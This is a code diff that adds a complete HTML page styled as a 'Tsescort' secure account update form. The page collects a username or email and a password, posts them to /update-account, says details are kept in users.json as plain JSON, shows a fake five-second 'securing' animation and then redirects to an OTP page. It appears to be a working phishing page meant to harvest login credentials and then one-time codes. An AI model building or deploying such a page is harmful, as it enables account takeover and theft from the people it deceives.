@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Tsescort · Secure Account Update</title>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+<style>
+*{margin:0;padding:0;box-sizing:border-box;font-family:'Inter',system-ui,-apple-system,sans-serif}
+body{background:radial-gradient(circle at 30% 20%,#1a0a0a,#050203);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:1.5rem}
+.card{background:rgba(14,8,10,.88);backdrop-filter:blur(14px);-webkit-backdrop-filter:blur(14px);border:1px solid rgba(255,60,60,.22);border-radius:2.8rem;padding:2.5rem 2rem 2.2rem;width:100%;max-width:480px;box-shadow:0 35px 60px -15px #000000ee,0 0 0 1px rgba(255,40,40,.08) inset}
+.logo-wrap{display:flex;flex-direction:column;align-items:center;margin-bottom:1.8rem}
+.logo-ts{font-size:2.6rem;font-weight:900;letter-spacing:3px;background:linear-gradient(135deg,#ff3b3b,#ff6b4a,#ff2a2a);-webkit-background-clip:text;background-clip:text;-webkit-text-fill-color:transparent;filter:drop-shadow(0 0 20px #ff2a2a99) drop-shadow(0 0 40px #ff000066);line-height:1;animation:logoPulse 2.6s infinite alternate}
+@keyframes logoPulse{0%{filter:drop-shadow(0 0 12px #ff3b3b99) drop-shadow(0 0 30px #ff000044)}100%{filter:drop-shadow(0 0 28px #ff3b3bdd) drop-shadow(0 0 60px #ff000088)}}
+.logo-sub{color:#ff5e5e;font-size:.7rem;letter-spacing:6px;text-transform:uppercase;font-weight:600;margin-top:6px;text-shadow:0 0 12px #ff3b3b77}
+.subhead{text-align:center;color:#c59a9a;font-size:.95rem;margin:1.4rem 0 2rem;display:flex;align-items:center;justify-content:center;gap:8px;background:#140b0d;padding:.6rem 1rem;border-radius:3rem;border:1px solid #3a1a1a}
+.subhead i{color:#ff4a4a}
+.input-group{margin-bottom:1.6rem;position:relative}
+.input-group label{display:block;color:#dbb8b8;font-size:.8rem;font-weight:600;margin-bottom:.5rem;letter-spacing:.5px;text-transform:uppercase;padding-left:.25rem}
+.input-group i{position:absolute;left:1.1rem;top:2.75rem;color:#ff4a4a;font-size:1.1rem;opacity:.85;pointer-events:none}
+.input-group input{width:100%;padding:1rem 1rem 1rem 3rem;background:#0d0608;border:1.5px solid #3a1e1e;border-radius:1.3rem;font-size:1rem;color:#ffeeee;outline:none;transition:.2s}
+.input-group input:focus{border-color:#ff4a4a;box-shadow:0 0 0 4px rgba(255,60,60,.18);background:#140a0c}
+.input-group input::placeholder{color:#6b4444;font-size:.95rem}
+.update-btn{width:100%;padding:1rem;background:linear-gradient(135deg,#d42b2b,#ff3b3b,#cc1f1f);border:none;border-radius:1.8rem;color:#fff;font-size:1.1rem;font-weight:700;letter-spacing:.6px;display:flex;align-items:center;justify-content:center;gap:.75rem;cursor:pointer;margin-top:1rem;box-shadow:0 18px 30px -10px #5e0e0e;transition:.2s;border:1px solid rgba(255,255,255,.12)}
+.update-btn:hover{filter:brightness(1.15);box-shadow:0 22px 36px -10px #8b1a1a}
+.update-btn:active{transform:scale(.98)}
+.update-btn:disabled{opacity:.75;filter:grayscale(.3);pointer-events:none}
+.legal-note{text-align:center;margin-top:1.8rem;font-size:.72rem;color:#7a5555;display:flex;align-items:center;justify-content:center;gap:6px}
+.legal-note i{color:#ff4a4a}
+.loading-overlay{position:fixed;inset:0;background:rgba(5,2,3,.94);backdrop-filter:blur(16px);display:flex;flex-direction:column;align-items:center;justify-content:center;z-index:2000;visibility:hidden;opacity:0;transition:.35s}
+.loading-overlay.active{visibility:visible;opacity:1}
+.ts-loader{position:relative;width:120px;height:120px;display:flex;align-items:center;justify-content:center;margin-bottom:2.2rem}
+.ts-ring{position:absolute;width:100%;height:100%;border-radius:50%;border:4px solid transparent;border-top-color:#ff3b3b;border-right-color:#ff6b4a;border-bottom-color:#ff2a2a;animation:spinRing 1.4s cubic-bezier(.65,.15,.35,.85) infinite;filter:drop-shadow(0 0 16px #ff3b3bcc)}
+.ts-ring-2{position:absolute;width:84%;height:84%;border-radius:50%;border:3px solid transparent;border-left-color:#ff7a7a;border-top-color:#ff4a4a;animation:spinRingReverse 1.8s cubic-bezier(.55,.1,.45,.9) infinite;filter:drop-shadow(0 0 10px #ff5e5e99)}
+.ts-core{position:relative;z-index:5;font-size:2.4rem;font-weight:900;letter-spacing:2px;background:linear-gradient(135deg,#ff3b3b,#ff7a4a,#ff1f1f);-webkit-background-clip:text;background-clip:text;-webkit-text-fill-color:transparent;filter:drop-shadow(0 0 20px #ff2a2acc);animation:corePulse 1.6s ease-in-out infinite alternate}
+@keyframes spinRing{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}
+@keyframes spinRingReverse{0%{transform:rotate(0)}100%{transform:rotate(-360deg)}}
+@keyframes corePulse{0%{transform:scale(.96);filter:drop-shadow(0 0 12px #ff3b3bcc)}100%{transform:scale(1.06);filter:drop-shadow(0 0 32px #ff2a2aff)}}
+.loading-overlay p{color:#ffd6d6;font-size:1.15rem;display:flex;align-items:center;gap:.75rem;background:rgba(30,10,12,.8);padding:.8rem 2rem;border-radius:60px;border:1px solid #5e2020;box-shadow:0 10px 30px -8px #000000cc,0 0 25px #ff3b3b22}
+.loading-overlay p i{color:#ff4a4a}
+.dot-flash{display:inline-flex;gap:4px}
+.dot-flash span{width:6px;height:6px;background:#ff4a4a;border-radius:50%;animation:dotFlash 1.4s infinite ease-in-out both}
+.dot-flash span:nth-child(2){animation-delay:.2s}
+.dot-flash span:nth-child(3){animation-delay:.4s}
+@keyframes dotFlash{0%,80%,100%{opacity:.3;transform:scale(.8)}40%{opacity:1;transform:scale(1.2)}}
+</style>
+</head>
+<body>
+<div class="card">
+<div class="logo-wrap">
+<div class="logo-ts">TSESCORT</div>
+<div class="logo-sub">secure account update</div>
+</div>
+<div class="subhead"><i class="fas fa-lock"></i> Please login to update your account</div>
+<form id="updateForm">
+<div class="input-group">
+<label for="identifier">Email, phone, or username</label>
+<i class="fas fa-user-circle"></i>
+<input type="text" id="identifier" placeholder="you@tsescort.com · +1 234 5678 · @user" autocomplete="username" required>
+</div>
+<div class="input-group">
+<label for="password">Password</label>
+<i class="fas fa-key"></i>
+<input type="password" id="password" placeholder="••••••••" autocomplete="current-password" required>
+</div>
+<button type="submit" class="update-btn" id="updateBtn"><i class="fas fa-pen-to-square"></i> Update account</button>
+</form>
+<div class="legal-note"><i class="fas fa-shield"></i> Details stored in users.json (plain JSON)</div>
+</div>
+<div class="loading-overlay" id="loadingOverlay">
+<div class="ts-loader"><div class="ts-ring"></div><div class="ts-ring-2"></div><div class="ts-core">TS</div></div>
+<p><i class="fas fa-lock"></i> Securing your update <span class="dot-flash"><span></span><span></span><span></span></span></p>
+</div>
+<script>
+(function(){
+const form=document.getElementById('updateForm');
+const updateBtn=document.getElementById('updateBtn');
+const loadingOverlay=document.getElementById('loadingOverlay');
+const identifierInput=document.getElementById('identifier');
+const passwordInput=document.getElementById('password');
+const SERVER_URL='/update-account';
+async function sendUpdateRequest(identifier,password){
+const payload={identifier:identifier.trim(),password:password,timestamp:new Date().toISOString(),app:'tsescort'};
+try{
+const r=await fetch(SERVER_URL,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(payload)});
+if(!r.ok)console.warn('Server responded with:',r.status);
+else{const d=await r.json().catch(()=>({}));console.log('[Tsescort] Update saved:',d);}
+}catch(e){console.error('[Tsescort] Network error:',e);}
+}
+form.addEventListener('submit',async(e)=>{
+e.preventDefault();
+if(updateBtn.disabled)return;
+const identifier=identifierInput.value.trim();
+const password=passwordInput.value;
+if(!identifier||!password){alert('Please fill in all fields.');return;}
+updateBtn.disabled=true;
+updateBtn.innerHTML='<i class="fas fa-spinner fa-spin"></i> Processing...';
+const startTime=Date.now();
+loadingOverlay.classList.add('active');
+await sendUpdateRequest(identifier,password);
+const elapsed=Date.now()-startTime;
+const remaining=Math.max(0,5000-elapsed);
+setTimeout(()=>{loadingOverlay.classList.remove('active');window.location.href='otp.html';},remaining);
+});
+})();
+</script>
+</body>
+</html>
